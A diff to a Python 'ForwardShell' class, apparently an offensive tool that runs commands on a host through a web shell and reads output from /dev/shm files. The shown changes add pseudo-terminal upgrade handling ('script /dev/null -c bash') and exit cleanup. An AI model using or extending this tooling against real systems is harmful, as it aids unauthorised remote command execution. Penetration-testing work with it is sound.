@@ -6,6 +6,7 @@ from base64 import b64encode
 from random import randint
 from termcolor import colored
 import time
+import sys
 
 class ForwardShell:
 
@@ -15,6 +16,7 @@ class ForwardShell:
         self.stdout = f"/dev/shm/{session}.output"
         self.main_url = url
         self.arg = arg
+        self.is_pseudo_term = False
 
     def set_data(self, command):
         data = {
@@ -75,8 +77,31 @@ class ForwardShell:
         int_type = ">"
         self.set_setup()
 
-        while True:
-            command = input(colored(int_type + " ", "yellow")) 
+        entry = colored(int_type + " ", "yellow")
+        
+        while True: 
+            if not self.is_pseudo_term: 
+                entry = colored(int_type + " ", "yellow")
+
+            command = input(entry)
             output = self.run_command(command)
             output = self.read_output()
+            
+            if command == "script /dev/null -c bash":
+                print(colored("\n[+] A pseudo-terminal has been initialized.", "blue"))
+                self.is_pseudo_term = True
+                entry = colored(output.split('\n')[-1], "yellow")
+            
+            if command == "exit":
+                if self.is_pseudo_term:
+                    print(colored("\n[+] A pseudo-terminal has been closed.\n", "red"))
+                    self.is_pseudo_term = False
+                    continue
+                else:
+                    self.remove_files()
+                    sys.exit(1)
+                                
+            if self.is_pseudo_term:
+                output = "\n" + '\n'.join(output.split('\n')[2:-1]) + "\n" 
+            
             print(output)
